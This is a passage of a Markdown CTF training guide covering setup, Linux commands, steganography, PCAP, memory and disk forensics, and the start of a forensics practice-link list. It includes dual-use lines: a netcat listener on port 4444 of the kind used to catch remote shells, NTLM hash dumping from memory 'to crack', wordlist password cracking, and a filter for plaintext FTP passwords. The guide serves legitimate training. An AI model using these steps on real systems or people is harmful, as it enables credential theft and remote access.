# 🏆 The Complete CTF Bible — From Zero to Champion
### Forensics | OSINT | Cryptography | Web Exploitation | Miscellaneous
### A Complete Learning Package: Beginner → Intermediate → Advanced → Pro
### With Topic-by-Topic Practice Links: Easy → Hard

---

> **"CTF players are the sharpest minds in security. They solve problems others can't even formulate."**
> **"The flag is always there. You just haven't looked in the right place yet."**
> **"Don't practice until you get it right. Practice until you can't get it wrong."**

---

## 📋 How to Use This Book

This is a **complete, self-contained CTF learning package**. After each topic, you will find a **Practice Links Section** — a curated list of free CTF challenges ordered from easy to hard so you can immediately apply what you learned.

**The Learning Loop:**
```
Read Theory → Understand Tools → Try Commands → Practice CTF Links → Write Writeup → Next Topic
```

---

## 📚 Interactive Table of Contents

### 🔴 PART 0 — FOUNDATIONS
- [Chapter 0 — What Is CTF?](#ch0)
- [Chapter 1 — The CTF Mindset](#ch1)
- [Chapter 2 — Environment Setup](#ch2)
- [Chapter 3 — Linux CLI Mastery](#ch3)

### 🟡 PART 1 — FORENSICS
- [Chapter 4 — Forensics Theory](#ch4)
- [Chapter 5 — File Formats and Magic Bytes](#ch5)
- [Chapter 6 — Image Steganography](#ch6)
- [Chapter 7 — Audio Steganography](#ch7)
- [Chapter 8 — Network Forensics (PCAP)](#ch8)
- [Chapter 9 — Memory Forensics](#ch9)
- [Chapter 10 — Disk Forensics](#ch10)
- [Chapter 11 — Metadata Analysis](#ch11)
- [Chapter 12 — Forensics Practice Links: Easy → Hard](#ch12)

### 🟢 PART 2 — OSINT
- [Chapter 13 — OSINT Theory](#ch13)
- [Chapter 14 — Person OSINT](#ch14)
- [Chapter 15 — Geolocation OSINT](#ch15)
- [Chapter 16 — Domain and IP OSINT](#ch16)
- [Chapter 17 — Social Media OSINT](#ch17)
- [Chapter 18 — Image OSINT](#ch18)
- [Chapter 19 — OSINT Practice Links: Easy → Hard](#ch19)

### 🔵 PART 3 — CRYPTOGRAPHY
- [Chapter 20 — Crypto Theory](#ch20)
- [Chapter 21 — Classical Ciphers](#ch21)
- [Chapter 22 — Modern Symmetric Attacks](#ch22)
- [Chapter 23 — RSA Attacks](#ch23)
- [Chapter 24 — Hash Cracking](#ch24)
- [Chapter 25 — Encoding vs Encryption](#ch25)
- [Chapter 26 — Crypto Practice Links: Easy → Hard](#ch26)

### 🟠 PART 4 — WEB EXPLOITATION
- [Chapter 27 — Web Theory](#ch27)
- [Chapter 28 — SQL Injection](#ch28)
- [Chapter 29 — XSS](#ch29)
- [Chapter 30 — SSTI](#ch30)
- [Chapter 31 — File Inclusion (LFI/RFI)](#ch31)
- [Chapter 32 — Command Injection](#ch32)
- [Chapter 33 — Authentication Bypass and IDOR](#ch33)
- [Chapter 34 — XXE, SSRF, Deserialization](#ch34)
- [Chapter 35 — Web Practice Links: Easy → Hard](#ch35)

### ⚫ PART 5 — MISCELLANEOUS
- [Chapter 36 — Misc Theory](#ch36)
- [Chapter 37 — Programming Challenges](#ch37)
- [Chapter 38 — Jail Escapes](#ch38)
- [Chapter 39 — QR Codes and Visual Puzzles](#ch39)
- [Chapter 40 — Misc Practice Links: Easy → Hard](#ch40)

### 🟣 PART 6 — BECOMING PRO
- [Chapter 41 — Complete Platform Rankings](#ch41)
- [Chapter 42 — Week-by-Week 6-Month Roadmap](#ch42)
- [Chapter 43 — All-Topic Master Practice Schedule](#ch43)
- [Chapter 44 — Building Your CTF Career Portfolio](#ch44)

### ⚡ APPENDICES
- [Appendix A — All Tools by Category](#appa)
- [Appendix B — Encoding Quick Reference](#appb)
- [Appendix C — Crypto Math Quick Reference](#appc)
- [Appendix D — Web Attack Cheatsheet](#appd)
- [Appendix E — Master Resource Links](#appe)

---

# PART 0 — FOUNDATIONS

---

# Chapter 0: What Is CTF? {#ch0}

## 0.1 CTF Types Explained

```
TYPE 1: JEOPARDY (Most Common — start here)
  Challenges organized by category, each with a flag
  Solve any challenge in any order
  Winner = highest points
  Examples: picoCTF, CSAW, CTFtime events

TYPE 2: ATTACK-DEFENSE
  Each team defends their own server + attacks others
  Advanced teams only (5+ experienced members)
  Examples: DEF CON CTF finals, iCTF

TYPE 3: KING OF THE HILL
  Compromise a shared machine, maintain access
  Examples: HackTheBox KotH

FOR BEGINNERS: Always start with JEOPARDY
```

## 0.2 The Six CTF Categories

```
FORENSICS      → Investigate files, images, audio, memory, network
OSINT          → Find public information about people, domains, locations
CRYPTOGRAPHY   → Break ciphers, crack hashes, find implementation flaws
WEB            → Exploit web application vulnerabilities
REVERSE ENG    → Analyze compiled binaries (covered in RE Bible)
BINARY EXPLOIT → Memory corruption attacks (covered in RE Bible)
MISCELLANEOUS  → Everything else: QR codes, programming, jail escapes
```

## 0.3 How Flags Work

```bash
# Flag formats (always check competition rules first!):
CTF{some_text_here}
picoCTF{some_text}
HTB{some_text}
flag{some_text}
THM{some_text}

# Quick flag grep from any output:
echo "output" | grep -oE "CTF\{[^}]+\}|flag\{[^}]+\}|picoCTF\{[^}]+\}"

# Always check the competition description for the exact flag format!
```

---

# Chapter 1: The CTF Mindset {#ch1}

## 1.1 How Champions Think

```
THE BEGINNER MINDSET vs THE CHAMPION MINDSET:

Beginner: "I don't know where to start."
Champion: "What do I know FOR CERTAIN? What are ALL possibilities?"

Beginner: "I've tried one thing and it didn't work. I'm stuck."
Champion: "Every failed attempt eliminates a possibility. I know more now."

Beginner: "Maybe I need to learn more theory first."
Champion: "I have enough to try. I learn by doing, not waiting."

THE KEY DIFFERENCE:
Champions don't know more — they think MORE SYSTEMATICALLY.
```

## 1.2 The Universal Problem-Solving Framework

```
For EVERY CTF challenge, in order:

STEP 1: IDENTIFY — What are you looking at?
  file, strings, hexdump, checksec, exiftool

STEP 2: ENUMERATE — What do you know?
  Run basic analysis tools. List EVERYTHING you observe.
  Do NOT skip this step. Champions enumerate completely.

STEP 3: HYPOTHESIZE — What could this be?
  List 3-5 techniques that could apply, ordered by probability.
  Use the challenge category + description to prioritize.

STEP 4: TRY — Test your hypothesis
  Try the most likely technique first.
  Time box: 15-20 minutes per hypothesis. Then pivot.

STEP 5: VERIFY — Is this the flag?
  Does output match flag format?
  Does it make thematic sense for the challenge?

STEP 6: PIVOT — When stuck
  Re-read the description carefully (hint is always there!)
  What haven't you tried yet?
  Ask: "What if this is two layers deep?"
```

## 1.3 The 5-Minute Triage Method

```bash
# For EVERY challenge, first 5 minutes — no exceptions:

MINUTE 1: Read description carefully, note hints
MINUTE 2: file → checksec → strings → hexdump (first few lines)
MINUTE 3: Download/unzip if needed, check all files
           strings filename | grep -iE "flag|CTF|key|pass|secret"
MINUTE 4: Run primary tool for category
MINUTE 5: If not solved → form 3 hypotheses, prioritize

# If flag found in 5 minutes → easy challenge, move on quickly
# If not → now start systematic deeper analysis
```

---

# Chapter 2: Setting Up Your CTF Environment {#ch2}

## 2.1 Recommended Setup

```bash
# Best option: Kali Linux VM (has most tools pre-installed)
# Download: https://www.kali.org/

# Update and upgrade first:
sudo apt update && sudo apt upgrade -y

# ── FORENSICS TOOLS ──────────────────────────────────────
sudo apt install -y binwalk foremost steghide exiftool \
    pngcheck file strings hexedit xxd wireshark tshark \
    volatility3 autopsy bulk-extractor sleuthkit testdisk \
    photorec scalpel zbar-tools qrencode sonic-visualiser sox

sudo gem install zsteg                        # PNG/BMP steganography
pip3 install stegoveritas pillow stegano      # Python steg tools

# ── CRYPTO TOOLS ─────────────────────────────────────────
sudo apt install -y hashcat john openssl sagemath gpg
pip3 install pycryptodome owiener z3-solver
# RsaCtfTool: git clone https://github.com/RsaCtfTool/RsaCtfTool

# ── OSINT TOOLS ──────────────────────────────────────────
sudo apt install -y whois dnsutils nmap curl wget jq
pip3 install sherlock-project theHarvester

# ── WEB TOOLS ────────────────────────────────────────────
sudo apt install -y burpsuite sqlmap nikto gobuster ffuf wfuzz
pip3 install dirsearch

# ── GENERAL ──────────────────────────────────────────────
sudo apt install -y python3 python3-pip tmux git gcc g++ gdb
pip3 install pwntools

# StegSolve (Java GUI tool for image analysis):
mkdir -p ~/tools
wget https://github.com/Eugenio2314/ctf_tools/raw/master/stegsolve.jar \
     -O ~/tools/stegsolve.jar
alias stegsolve='java -jar ~/tools/stegsolve.jar'
```

## 2.2 Essential Websites (Bookmark All)

```
🔧 ALL-IN-ONE:
  CyberChef:     https://gchq.github.io/CyberChef/    ← USE THIS FIRST ALWAYS
  dCode.fr:      https://www.dcode.fr/               ← 500+ cipher tools
  CrackStation:  https://crackstation.net/            ← Instant hash lookup
  HackTricks:    https://book.hacktricks.xyz/         ← Technique reference

🔍 FORENSICS:
  Aperisolve:    https://www.aperisolve.com/          ← Runs 10+ steg tools auto
  FotoForensics: https://fotoforensics.com/           ← Image ELA analysis
  Forensically:  https://29a.ch/photo-forensics/

🌐 OSINT:
  Shodan:        https://www.shodan.io/
  crt.sh:        https://crt.sh/                     ← Subdomain discovery
  Wayback:       https://web.archive.org/
  HIBP:          https://haveibeenpwned.com/
  WhatsMyName:   https://whatsmyname.app/

🔐 CRYPTO:
  jwt.io:        https://jwt.io/                     ← JWT decoder/editor
  FactorDB:      http://factordb.com/                ← RSA factor lookup
  RSA ECM:       https://www.alpertron.com.ar/ECM.HTM
  QuipQuip:      https://quipqiup.com/               ← Substitution solver

📖 LEARNING:
  CTFtime:       https://ctftime.org/                ← CTF calendar + writeups
  PayloadsAll:   https://github.com/swisskyrepo/PayloadsAllTheThings
  0xdf:          https://0xdf.gitlab.io/             ← Excellent writeups
```

---

# Chapter 3: Linux CLI Mastery for CTF {#ch3}

## 3.1 Essential Commands

```bash
# ── FILE IDENTIFICATION ───────────────────────────────────
file unknown_file            # True file type (ignores extension!)
xxd unknown_file | head -20  # Hex dump - first 20 lines
strings -n 6 unknown_file    # Printable strings 6+ chars
strings unknown_file | grep -iE "flag|CTF|key|pass|secret|hidden"
exiftool unknown_file        # All metadata

# ── ARCHIVE OPERATIONS ───────────────────────────────────
unzip file.zip -d output/     # Extract ZIP
unzip -P "password" file.zip  # With password
binwalk -e file               # Extract embedded files (MAGIC COMMAND!)
binwalk -Me file              # Recursive extract (for nested archives)
tar xvf file.tar.gz           # Extract tar
7z x file.7z                  # Extract 7zip

# ── TEXT PROCESSING ──────────────────────────────────────
grep -oE "CTF\{[^}]+\}" file.txt     # Extract flag pattern
strings file | grep -E ".{20,}"      # Long strings (keys, flags)
cat file | tr 'a-z' 'A-Z'           # Uppercase
echo "hello" | rev                   # Reverse string
sort file.txt | uniq                 # Remove duplicates
cut -d',' -f1 data.csv               # First CSV column

# ── ENCODING OPERATIONS ──────────────────────────────────
echo -n "hello" | base64             # Encode
echo "aGVsbG8=" | base64 -d         # Decode
echo "68656c6c6f" | xxd -r -p       # Hex to string
echo -n "hello" | xxd -p            # String to hex
python3 -c "import codecs; print(codecs.encode('Uryyb', 'rot_13'))"  # ROT13

# ── PYTHON ONE-LINERS ────────────────────────────────────
python3 -c "import base64; print(base64.b64decode('aGVsbG8=').decode())"
python3 -c "print(bytes.fromhex('48656c6c6f').decode())"
python3 -c "print(''.join(chr(int(b,2)) for b in '01001000 01100101'.split()))"
python3 -c "print(int('ff', 16))"   # Hex to decimal
python3 -m http.server 8080         # Quick web server

# ── NETWORK COMMANDS ─────────────────────────────────────
curl -v http://target.com/           # HTTP with headers
curl -s http://target.com/ | grep -i flag   # Grep response
curl -X POST -d "user=admin&pass=test" http://target.com/login
nc host port                         # TCP connect
nc -lvnp 4444                        # Listen for connection

# ── FILE RECOVERY AND CARVING ────────────────────────────
foremost -i image.dd -o ./output/    # File carving
fls -r disk.img                      # List filesystem files
fls -r -d disk.img                   # DELETED files only!
icat disk.img INODE > recovered_file # Extract by inode number
strings disk.img | grep -iE "flag|CTF"  # Search entire disk!
```

---

# PART 1 — FORENSICS

---

# Chapter 4: Forensics Theory {#ch4}

## 4.1 What Is Digital Forensics in CTF?

```
FORENSICS in CTF = "Find the hidden data"

You receive a file (image, audio, PCAP, memory dump, disk image)
and must extract the flag hidden inside it.

FORENSICS CHALLENGE TYPES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TYPE              WHAT IT IS              PRIMARY TOOL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Steganography     Data hidden in image/   zsteg, steghide,
                  audio/video             stegsolve, binwalk
File Analysis     Disguised/corrupted     file, hexedit,
                  files, wrong headers    python script
Network PCAP      Captured traffic        Wireshark, tshark
Memory Dump       RAM snapshot            Volatility3
Disk Image        Drive forensics         Autopsy, sleuthkit
Document          Metadata, macros        exiftool, olevba
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

FORENSICS MINDSET — ask these in order:
1. "What FORMAT is this file?" → file command
2. "Is there something UNUSUAL?" → wrong size? extra bytes?
3. "Is there HIDDEN DATA?" → steganography tools
4. "Is there METADATA?" → exiftool
5. "Can I EXTRACT something?" → binwalk
6. "Is the file CORRUPTED?" → check/fix magic bytes
```

---

# Chapter 5: File Formats and Magic Bytes {#ch5}

## 5.1 The Magic Bytes Reference

Every file type starts with specific bytes. CTF challenges often
rename or corrupt these to disguise the file's true type.

```bash
# Check TRUE file type (ignores extension):
file suspicious.jpg

# Read first bytes manually:
xxd suspicious.jpg | head -3
```

```
FILE TYPE   HEX MAGIC BYTES                READABLE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
JPEG        FF D8 FF E0 / FF D8 FF E1     ÿØÿà / ÿØÿá
PNG         89 50 4E 47 0D 0A 1A 0A       .PNG....
GIF         47 49 46 38 37/39 61          GIF87a / GIF89a
PDF         25 50 44 46 2D                %PDF-
ZIP         50 4B 03 04                   PK..
GZIP        1F 8B                         ..
BZIP2       42 5A 68                      BZh
7ZIP        37 7A BC AF 27 1C             7z....
RAR         52 61 72 21 1A 07             Rar!...
ELF (Linux) 7F 45 4C 46                  .ELF
PE (Windows)4D 5A                         MZ
BMP         42 4D                         BM
MP3         49 44 33                      ID3
WAV         52 49 46 46...57 41 56 45    RIFF...WAVE
OGG         4F 67 67 53                   OggS
DOCX/XLSX   50 4B 03 04 (same as ZIP!)   PK..
SQLITE      53 51 4C 69 74 65 20 33      SQLite 3
PCAP        D4 C3 B2 A1                   ....
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

KEY CTF TRICK: A .jpg showing "PK" = it's actually a ZIP!
Just rename: mv file.jpg file.zip && unzip file.zip
```

## 5.2 Repairing Corrupted Files

```python
#!/usr/bin/env python3
# Fix corrupted PNG magic bytes:

with open('broken.png', 'rb') as f:
    data = f.read()

# PNG correct magic: 89 50 4E 47 0D 0A 1A 0A
png_magic = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])
fixed = png_magic + data[8:]

with open('fixed.png', 'wb') as f:
    f.write(fixed)
print("Fixed!")

# Fix with dd command:
# printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' | dd of=broken.png bs=1 count=8 conv=notrunc

# Detect if bytes are XOR'd:
for key in range(256):
    decoded = bytes(b ^ key for b in data[:8])
    if decoded == png_magic:
        print(f"XOR key: {key} (0x{key:02x})")
```

---

# Chapter 6: Image Steganography {#ch6}

## 6.1 Theory: How Data Hides in Images

```
LSB (Least Significant Bit) — THE MOST COMMON CTF TECHNIQUE:
  Each pixel has R, G, B values (0-255)
  The LAST BIT of each value can be changed by 1
  Humans cannot see a 1-value difference in color
  But those bits can encode data!

  Example: RGB (200, 150, 100)
  Hide bit 1: change to (201, 150, 100) → barely different!
  Tools read all LSBs → reconstruct hidden message

EOF DATA (End-of-File Appended):
  Valid image data ends at a specific marker
  Anything after = invisible to image viewers
  Tools: binwalk, strings find this immediately

METADATA:
  EXIF data contains: GPS coordinates, camera, timestamps
  Sometimes: custom fields with hidden data
  Tool: exiftool shows all

STEGHIDE:
  Uses DCT coefficients in JPEG
  Can be password-protected
  Tools: steghide extract, stegseek (crack password)
```

## 6.2 Complete Image Steganography Workflow

```bash
IMG="challenge.png"

# ═══ PHASE 1: AUTOMATED SCAN (always first!) ═════════════
# Aperisolve runs 10+ tools in one click — use it FIRST:
# Upload to: https://www.aperisolve.com/

# Local automated scan:
python3 -m stegoveritas $IMG -out /tmp/steg_results/

# ═══ PHASE 2: TOOL-BY-TOOL ANALYSIS ══════════════════════

# Step 1: Basic checks
file $IMG
ls -la $IMG          # Note file size — unusually large?
exiftool $IMG        # ALL metadata — look for GPS, comments!
strings $IMG | grep -iE "flag|CTF|key|pass|hidden"

# Step 2: Check for embedded files
binwalk $IMG         # Find embedded files
binwalk -e $IMG      # Extract them! Creates _IMG.extracted/

# Step 3: LSB steganography (most common!)
zsteg $IMG           # PNG/BMP LSB analysis
zsteg -a $IMG        # Try ALL methods (comprehensive)
zsteg $IMG 2>/dev/null | grep -i "flag\|CTF\|text"

# Step 4: Steghide (JPEG/BMP with password)
steghide info $IMG                   # Any hidden data?
steghide extract -sf $IMG -p ""      # Try EMPTY password first!
steghide extract -sf $IMG -p "password"
# Brute force with stegseek:
stegseek $IMG /usr/share/wordlists/rockyou.txt

# Step 5: Try common passwords manually
for pass in "" "password" "secret" "hidden" "flag" "steg" \
            "steganography" "ctf" "challenge" "admin" "123456"; do
    steghide extract -sf $IMG -p "$pass" -q 2>/dev/null && \
        echo "[FOUND] Password: '$pass'"
done

# Step 6: Visual bit plane analysis (stegsolve)
java -jar ~/tools/stegsolve.jar
# Open image → use arrow keys to cycle through bit planes
# Look for: text, patterns, QR codes in bit planes!

# Step 7: outguess (JPEG-specific)
outguess -r $IMG output.txt 2>/dev/null && cat output.txt

# Step 8: Python RGB/Alpha channel analysis
python3 << 'EOF'
from PIL import Image
import numpy as np

img = Image.open('challenge.png').convert('RGBA')
data = np.array(img)

for idx, name in enumerate(['R','G','B','A']):
    channel = data[:,:,idx]
    lsb_bits = (channel & 1).flatten()
    chars = []
    for i in range(0, len(lsb_bits)-7, 8):
        byte = int(''.join(str(b) for b in lsb_bits[i:i+8]), 2)
        if 32 <= byte <= 126:
            chars.append(chr(byte))
    text = ''.join(chars[:100]).strip()
    if text and len(set(text)) > 5:  # Not just noise
        print(f"Channel {name} LSB: {text}")
EOF

# ═══ PHASE 3: SPECIAL CASES ═══════════════════════════════

# GIF animation — check EVERY frame:
convert challenge.gif -coalesce /tmp/frames/frame_%04d.png
ls /tmp/frames/  # View each frame individually

# PNG color palette manipulation:
pngcheck -v $IMG  # Validate PNG structure

# JPEG quality analysis (ELA):
# Upload to: https://fotoforensics.com/

# Whitespace steganography in text files:
cat file.txt | cat -A | grep -E "( \t|^\t)"
# Tools: snow, stegsnow
```

---

# Chapter 7: Audio Steganography {#ch7}

## 7.1 Theory and Techniques

```
SPECTROGRAM MESSAGES (most common CTF technique!):
  When you view audio as a frequency-over-time graph (spectrogram)
  text or images can be "drawn" into the frequency patterns
  They're invisible to the ear but visible when displayed visually!
  Tools: Sonic Visualizer, Audacity (spectrogram view), SoX

MORSE CODE IN AUDIO:
  Short beeps = dot (.)   Long beeps = dash (-)
  Listen carefully OR look at the waveform pattern
  Online decoder: https://morsecode.world/international/decoder/audio-decoder-adaptive.html

SSTV (Slow Scan Television):
  Harsh electronic/static-sounding audio
  Encodes an image using radio transmission standards
  Decode with: QSSTV (Linux), or MMSSTV (Windows)

LSB IN AUDIO:
  Same principle as image LSB
  Each audio sample's least significant bit stores hidden data
  Python scipy/wave analysis required
```

## 7.2 Audio Analysis Commands

```bash
AUDIO="challenge.wav"

# Step 1: Basic info
file $AUDIO
strings $AUDIO | grep -iE "flag|CTF"

# Step 2: Generate spectrogram (look at it visually!)
sox $AUDIO -n spectrogram -o spectrogram.png
eog spectrogram.png  # View the image — look for text!

# Step 3: Sonic Visualizer (best GUI tool)
sonic-visualiser $AUDIO
# Inside: Layer → Add Spectrogram → look for hidden text

# Step 4: Audacity
audacity $AUDIO
# Track dropdown → Spectrogram view

# Step 5: Check for Morse code
# Online: https://morsecode.world/international/decoder/audio-decoder-adaptive.html

# Step 6: SSTV decoding
qsstv &          # Open QSSTV in receive mode
aplay $AUDIO     # Play audio — QSSTV decodes if it's SSTV

# Step 7: Python LSB analysis
python3 << 'EOF'
import wave, numpy as np

with wave.open('challenge.wav', 'r') as wav:
    frames = wav.readframes(wav.getnframes())
    data = np.frombuffer(frames, dtype=np.int16)
    print(f"Duration: {wav.getnframes()/wav.getframerate():.1f}s")
    print(f"Sample rate: {wav.getframerate()} Hz")
    print(f"Channels: {wav.getnchannels()}")

# Extract LSB from each sample:
bits = [d & 1 for d in data]
chars = []
for i in range(0, len(bits)-7, 8):
    byte = int(''.join(str(b) for b in bits[i:i+8]), 2)
    if 32 <= byte <= 126:
        chars.append(chr(byte))
text = ''.join(chars[:200])
if text.strip():
    print(f"LSB data: {text}")
EOF
```

---

# Chapter 8: Network Forensics — PCAP Analysis {#ch8}

## 8.1 Theory: Reading Network Traffic

```
PCAP files = recordings of all network packets
Like a phone call recording — every byte transmitted is captured

WHAT TO LOOK FOR:
  HTTP → URL parameters, POST bodies, cookies, file transfers
  FTP  → Username, password (PLAINTEXT!), transferred files
  DNS  → Domain queries, possible DNS tunneling
  ICMP → Ping payload (flag sometimes hidden here!)
  TLS  → Encrypted (need key file to decrypt)
  SMTP → Emails with attachments

PROTOCOL HIERARCHY (check Statistics → Protocol Hierarchy first!):
  What's the most common protocol? → focus there first
  Unusual protocol? → definitely investigate
```

## 8.2 Wireshark Complete Guide

```bash
# Open PCAP:
wireshark capture.pcap &     # GUI
tshark -r capture.pcap       # CLI

# ── KEY DISPLAY FILTERS ────────────────────────────────────
# Type these in Wireshark's filter bar:

http                          # All HTTP traffic
http.request                  # HTTP requests
http.request.method == "POST" # Only POST requests
http contains "flag"          # HTTP containing "flag"
ftp                           # All FTP
ftp.request.command == "PASS" # FTP PASSWORDS!
ftp-data                      # FTP file transfers
dns                           # DNS queries
frame contains "CTF{"         # FLAG FORMAT SEARCH!
tcp.port == 80                # Port-specific
ip.addr == 192.168.1.1        # Specific IP

# ── KEY WIRESHARK FEATURES ─────────────────────────────────
# Follow TCP Stream (MOST IMPORTANT):
#   Right-click packet → Follow → TCP Stream
#   Shows complete conversation in readable form!

# Export Files:
#   File → Export Objects → HTTP (extracts all HTTP files)
#   File → Export Objects → FTP-DATA (extracts FTP files)

# Statistics → Protocol Hierarchy → see what's there
# Statistics → Conversations → find large data transfers

# ── TSHARK CLI COMMANDS ────────────────────────────────────
PCAP="capture.pcap"

# Protocol breakdown:
tshark -r $PCAP -q -z io,phs

# All HTTP URLs:
tshark -r $PCAP -Y "http.request" -T fields \
    -e ip.src -e http.request.method -e http.request.uri | head -20

# FTP credentials:
tshark -r $PCAP -Y "ftp.request.command == USER or ftp.request.command == PASS" \
    -T fields -e ftp.request.arg

# DNS queries:
tshark -r $PCAP -Y "dns.flags.response == 0" -T fields \
    -e dns.qry.name | sort | uniq

# ICMP payloads (flag often here!):
tshark -r $PCAP -Y "icmp.type == 8" -T fields -e data | \
    python3 -c "
import sys
for line in sys.stdin:
    try:
        data = bytes.fromhex(line.strip())
        text = data.decode('utf-8', errors='replace')
        if any(c.isalpha() for c in text):
            print(text)
    except: pass"

# Export all HTTP objects:
mkdir -p /tmp/pcap_files
tshark -r $PCAP --export-objects http,/tmp/pcap_files/
ls /tmp/pcap_files/

# Search entire PCAP for flag:
strings $PCAP | grep -iE "CTF\{|flag\{|picoCTF\{"

# Extract using tcpflow:
tcpflow -r $PCAP -c | strings | grep -i flag

# Decrypt HTTPS (if key provided):
# Wireshark → Edit → Preferences → TLS → Pre-Master Secret log
# Point to the .log file provided in challenge
```

---

# Chapter 9: Memory Forensics {#ch9}

## 9.1 Volatility3 Complete Reference

```bash
MEM="memory.raw"

# ── STEP 1: IDENTIFY OS ───────────────────────────────────
python3 vol.py -f $MEM windows.info   # Windows
python3 vol.py -f $MEM banners.Banners # Linux

# ── STEP 2: PROCESSES ────────────────────────────────────
python3 vol.py -f $MEM windows.pslist
python3 vol.py -f $MEM windows.pstree    # Tree view
python3 vol.py -f $MEM windows.psscan   # Finds HIDDEN processes!
# Linux:
python3 vol.py -f $MEM linux.pslist

# LOOK FOR: cmd.exe, notepad.exe, suspicious names
# MALWARE TRICK: compare pslist vs psscan — hidden PIDs = rootkit

# ── STEP 3: COMMAND HISTORY (gold mine!) ─────────────────
python3 vol.py -f $MEM windows.cmdline    # All process args
python3 vol.py -f $MEM windows.cmdscan   # cmd.exe history
python3 vol.py -f $MEM windows.consoles  # FULL I/O HISTORY!
# Linux:
python3 vol.py -f $MEM linux.bash        # Bash history

# ── STEP 4: FILES ────────────────────────────────────────
python3 vol.py -f $MEM windows.filescan | grep -i "flag\|\.txt\|\.zip"
# Dump a found file (get address from filescan):
python3 vol.py -f $MEM windows.dumpfiles --virtaddr 0xADDRESS

# ── STEP 5: NETWORK ──────────────────────────────────────
python3 vol.py -f $MEM windows.netstat
python3 vol.py -f $MEM windows.netscan

# ── STEP 6: CREDENTIALS ──────────────────────────────────
python3 vol.py -f $MEM windows.hashdump  # NTLM hashes → crack!
python3 vol.py -f $MEM windows.clipboard # Clipboard contents!

# ── STEP 7: DIRECT FLAG SEARCH ───────────────────────────
strings $MEM | grep -iE "CTF\{|flag\{|picoCTF\{"  # FAST! Often finds it!
strings -el $MEM | grep -iE "CTF\{|flag\{"          # 16-bit strings too

# ── MEMORY FORENSICS STRATEGY ────────────────────────────
echo "
1. strings memory | grep -i 'flag' → instant check
2. pslist → what processes were running?
3. cmdline/consoles → what was typed?
4. filescan | grep flag → any files named 'flag'?
5. clipboard → was flag copied?
6. dumpfiles → extract and analyze files
"
```

---

# Chapter 10: Disk Forensics {#ch10}

## 10.1 Disk Image Analysis

```bash
DISK="disk_image.img"

# Quick flag search (always first!):
strings $DISK | grep -iE "CTF\{|flag\{|picoCTF\{"

# Partition info:
fdisk -l $DISK
mmls $DISK

# Mount:
mkdir -p /tmp/mount
sudo mount -o loop,ro $DISK /tmp/mount
ls -la /tmp/mount/
find /tmp/mount -name "*flag*" -o -name "*.txt" 2>/dev/null

# Find DELETED files:
fls -r $DISK | head -50
fls -r -d $DISK | head -30   # DELETED ONLY!
# Recover by inode:
icat $DISK INODE_NUMBER > recovered_file

# File carving (recover deleted files):
sudo foremost -i $DISK -o /tmp/carved/
ls /tmp/carved/

# GUI tool:
sudo autopsy &   # Browse to http://localhost:9999/autopsy
```

---

# Chapter 11: Metadata Analysis {#ch11}

## 11.1 Metadata as Evidence

```bash
# EXIF data from any image (GPS coordinates! Author! Camera!):
exiftool photo.jpg
exiftool photo.jpg | grep -iE "GPS|Location|Author|Comment|Software"

# GPS coordinates → Google Maps:
exiftool photo.jpg | grep "GPS Position"
# Example: 48 deg 51' 31.80" N, 2 deg 17' 40.20" E → Eiffel Tower!

# Convert GPS to decimal for Google Maps:
python3 << 'EOF'
def dms_to_decimal(deg, min, sec, direction):
    decimal = deg + min/60 + sec/3600
    if direction in ['S', 'W']:
        decimal = -decimal
    return decimal

lat = dms_to_decimal(48, 51, 31.80, 'N')
lon = dms_to_decimal(2, 17, 40.20, 'E')
print(f"https://maps.google.com/?q={lat},{lon}")
EOF

# Strip metadata (important for privacy after challenges):
exiftool -all= photo.jpg    # Remove all metadata

# PDF metadata:
exiftool document.pdf
strings document.pdf | grep -iE "author|creator|producer"

# Office document metadata (DOCX/XLSX/PPTX are ZIP files!):
unzip document.docx -d /tmp/docx_contents/
cat /tmp/docx_contents/docProps/core.xml   # Author, dates
cat /tmp/docx_contents/docProps/app.xml    # Application info
```

---

# Chapter 12: Forensics Practice Links — Easy to Hard {#ch12}

## 12.1 Topic Completion → Practice These Challenges

> **How to use this section:** After reading Chapters 4-11, work through
> these challenges IN ORDER. Each link is free. Read a writeup only AFTER
> spending at least 30 minutes attempting it yourself.

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FORENSICS PRACTICE LINKS: EASY → HARD
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

★ BEGINNER (do first, Week 1-2):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

picoCTF — Forensics Category (free, year-round):
  https://play.picoctf.org/practice?category=4&page=1
  Start with these specifically:
  → "information"     : exiftool on a PNG, find flag in metadata
  → "Glory of the Garden" : strings on image, spot non-ASCII
  → "Shark on Wire 1" : PCAP, follow UDP stream
  → "Shark on Wire 2" : PCAP, filter by port
  → "Matryoshka doll" : nested images, binwalk recursion
  → "St3g0"           : steghide with easy password
  → "tunn3l v1s10n"   : corrupted BMP, fix header
  → "Wireshark Doo Dooo Do Doo" : PCAP, HTTP traffic
  → "Lookey here"     : strings + grep on file
  → "hideme"          : ZIP appended to PNG (binwalk!)

TryHackMe — Forensics Rooms (free tier available):
  → "OhSINT" (easy mix of forensics + OSINT):
     https://tryhackme.com/room/ohsint
  → "Forensics" beginner room:
     https://tryhackme.com/room/forensics
  → "Advent of Cyber" (December each year — beginner friendly!):
     https://tryhackme.com/room/adventofcyber2023
  → "Steganography":
     https://tryhackme.com/room/ccstego
  → "Disk Analysis & Autopsy":
     https://tryhackme.com/room/autopsy2ze0

CTFlearn — Forensics (free):
  https://ctflearn.com/challenge/browse?category=Forensics&difficulty=1
  → Start with 1-star challenges, work up to 3-star

★★ INTERMEDIATE (Week 3-6):
━━━━━━━━━━━━━━━━━━━━━━━━━━━

picoCTF Intermediate Forensics:
  → "Sleuthkit Intro"   : disk forensics, mmls + fls
  → "Sleuthkit Apprentice" : recover deleted file
